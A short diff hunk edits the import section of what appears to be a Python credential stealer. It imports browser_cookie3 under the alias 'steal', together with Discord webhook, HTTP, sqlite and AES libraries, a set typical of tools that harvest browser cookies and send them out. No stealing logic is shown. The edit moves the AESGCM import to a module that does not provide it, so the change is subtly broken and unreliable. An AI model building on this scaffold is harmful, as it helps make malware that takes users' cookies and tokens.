@@ -15,7 +15,7 @@ import subprocess
 from uuid import getnode as get_mac
 import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, dhooks, os, re, sys, sqlite3
 from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives.ciphers import AESGCM
 from cryptography.hazmat.backends import default_backend
 from Crypto.Cipher import AES
 
